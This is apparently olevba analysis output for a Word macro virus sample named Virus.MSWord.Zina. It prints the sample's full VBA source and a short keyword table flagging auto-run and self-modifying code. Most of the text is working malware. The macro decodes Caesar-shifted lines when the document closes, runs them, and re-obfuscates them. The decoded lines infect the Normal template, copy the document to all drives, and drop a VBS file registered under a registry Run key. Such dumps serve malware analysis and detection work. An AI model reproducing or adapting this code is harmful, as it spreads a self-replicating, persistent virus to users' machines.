olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Zina
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Zina - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open(): On Error Resume Next: Application.ScreenUpdating = False
'Nk%YmnxIthzrjsy%B%Fhyn{jIthzrjsy%Ymjs%Xjy%{}%B%StwrfqYjruqfyj%Jqxj%Xjy%{}%B%Fhyn{jIthzrjsy
'\nym%{}3[GUwtojhy3[GHtrutsjsyx-6.3HtijRtizqj
'%sfoin%B%3Qnsjx-<51%6.
'%{nwzx%B%Xywnslx3Ywnr-YmnxIthzrjsy3[GUwtojhy3[GHtrutsjsyx-6.3HtijRtizqj3Qnsjx-61%d
'%YmnxIthzrjsy3[GUwtojhy3[GHtrutsjsyx-6.3HtijRtizqj3HtzsyTkQnsjx..
'%%Nk%sfion%AC%',Qfw{f'%Ymjs
'%%%3ijqjyjqnsjx%61%3HtzsyTkQnsjx
'%%%3fiikwtrxywnsl%{nwzx
'%%Jsi%Nk
'Jsi%\nym
'Xjy%kx%B%HwjfyjTgojhy-'Xhwnuynsl3KnqjX~xyjrTgojhy'.
'Xjy%iwfo{t{n%B%kx3iwn{jx
'%Ktw%Jfhm%I%Ns%iwfo{t{n
'%%Nk%I3nxwjfi~%Ymjs
'%%%kx3htu~knqj%Fhyn{jIthzrjsy3KzqqSfrj1%I3iwn{jqjyyjw%+%'?a'1%Ywzj
'%%Jsi%Nk
'%Sj}y
'Tujs%'h?a\ns873{gx'%Ktw%Tzyuzy%Fx%(6
'%Uwnsy%(61%'ktw%f%B%6%yt%65'
'%%Uwnsy%(61%'Rxlgt}%''333Pfi%x{j%nlqjif%zrnwj1%tst%xj%zxy{fwn%wfiof''1{gX~xyjrRtifq1''333'''
'%Uwnsy%(61%'sj}y'
'Hqtxj%(6
'X~xyjr3Uwn{fyjUwtknqjXywnsl-''1%'MPJ^dQTHFQdRFHMNSJaXtky|fwjaRnhwtxtkya\nsit|xaHzwwjsy[jwxntsaWzs'1%'P87Xjy'.%B%'h?a\ns873{gx'
'Nk%If~-St|-..%B%<%Ymjs
'%Ithzrjsyx3Fii
'%%\nym%Xjqjhynts
'%%%3Yj}y%B%'PFI%X[J%N_LQJIF%IF%ZRNWJ1%TST%XJ%ZXY[FWN%WFIOF'%d
'%%%%%%%%%+%'%%%\R3Qfw{f%g~%Xujhnj%`Xujhnjx%[nwzx%Qfgxb%%%%'%d
'%%%%%%%%%+%'%%%%%%%%%%%%%%%%%%%7%5%5%6%%%%%%%%%%%%%%%%%%%%'
'%%%3GtqiWzs
'%%%3Xmfinsl3GfhplwtzsiUfyyjwsHtqtw%B%|iHtqtwGqfhp
'%%%3Xmfinsl3KtwjlwtzsiUfyyjwsHtqtw%B%|iHtqtw[ntqjy
'%%%3Htqqfuxj%Inwjhynts?B|iHtqqfuxjXyfwy
'%%Jsi%\nym
'Fhyn{jIthzrjsy3Fhyn{j\nsit|3UwnsyTzy%d
'Wfslj?B|iUwnsyKwtrYt1%Kwtr?B'6'1%Yt?B'65'
'Jsi%Nk
'Fuuqnhfynts3XhwjjsZuifynsl%B%Ywzj
End Sub
Private Sub document_close(): On Error Resume Next
For kd = 2 To 39
 okod = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(kd, 1)
 If Left(okod, 1) = "'" Then
  desni = Right(okod, Len(okod) - 1)
  ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine kd, desni
  For s = 1 To Len(desni)
   vracaj = vracaj & Chr(Asc(Mid(desni, s)) - 5)
   ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine kd, vracaj
  Next
  vracaj = ""
 End If
Next
Document_Open
For T = 2 To 39
 nkod = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(T, 1)
 If Left(nkod, 1) <> "'" Then
  duzina = Len(nkod)
  midl = Mid(nkod, 1, duzina)
  For o = 1 To duzina
   k = Left(midl, o)
   k2 = Chr(Asc(Mid(k, Len(k))) + 5)
   linija = linija & k2
   ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine T, "'" & linija
  Next
  linija = ""
 End If
Next
End Sub
'Larva
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

